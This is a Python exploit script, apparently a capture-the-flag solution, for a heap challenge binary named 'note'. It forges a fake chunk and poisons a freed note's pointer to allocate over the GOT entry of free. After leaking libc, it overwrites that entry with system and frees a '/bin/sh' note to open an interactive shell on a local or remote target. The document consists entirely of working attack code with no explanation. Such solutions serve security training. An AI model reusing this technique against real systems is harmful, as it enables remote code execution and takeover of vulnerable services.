#!/usr/bin/env python
from sc_expwn import *  # https://raw.githubusercontent.com/shift-crops/sc_expwn/master/sc_expwn.py

bin_file = './note'
context(os = 'linux', arch = 'amd64')
context.log_level = 'debug'

#==========

env = Environment('debug', 'local', 'remote')
env.set_item('mode',    debug = 'DEBUG', local = 'PROC', remote = 'SOCKET')
env.set_item('target',  debug   = {'argv':[bin_file], 'aslr':False}, \
                        local   = {'argv':[bin_file]}, \
                        remote  = {'host':'target.com', 'port':4296})
env.set_item('libc',    debug   = None, \
                        local   = None, \
                        remote  = 'libc-2.23.so')
env.select()

#==========

binf = ELF(bin_file)
addr_name           = binf.symbols['name']
addr_got_free       = binf.got['free']

libc = ELF(env.libc) if env.libc else binf.libc
offset_libc_free    = libc.sep_function['free']

#==========

def attack(conn):
    note = Note(conn)

    conn.sendafter('>> ', 'a'*0x18+p64(0x41)[:-1])

    note.add('0')
    note.delete(0)
    note.edit(0, p64(addr_name + 0x10))

    note.add(p64(0)+p64(0x41))
    note.add(p64(addr_got_free))
    note.add('/bin/sh')

    addr_libc_free = u(note.show(0))
    libc.address = addr_libc_free - offset_libc_free
    info('addr_libc_base    = 0x{:08x}'.format(libc.address))
    addr_libc_system = libc.sep_function['system']

    note.edit(0, p64(addr_libc_system))
    note.delete(1)

class Note:
    def __init__(self, conn):
        self.recvuntil      = conn.recvuntil
        self.recv           = conn.recv
        self.sendline       = conn.sendline
        self.send           = conn.send
        self.sendlineafter  = conn.sendlineafter
        self.sendafter      = conn.sendafter

    def add(self, data):
        self.sendlineafter('> ', '1')
        self.sendafter('note > ', data)

    def show(self, idx):
        self.sendlineafter('> ', '2')
        self.sendlineafter('id > ', str(idx))
        self.recvuntil('\n')
        return self.recvuntil('\n\n', drop=True)

    def edit(self, idx, data):
        self.sendlineafter('> ', '3')
        self.sendlineafter('id > ', str(idx))
        self.sendafter('note > ', data)

    def delete(self, idx):
        self.sendlineafter('> ', '4')
        self.sendlineafter('id > ', str(idx))

#==========

if __name__=='__main__':
    conn = communicate(env.mode, **env.target)
    attack(conn)
    conn.interactive()
    
#==========
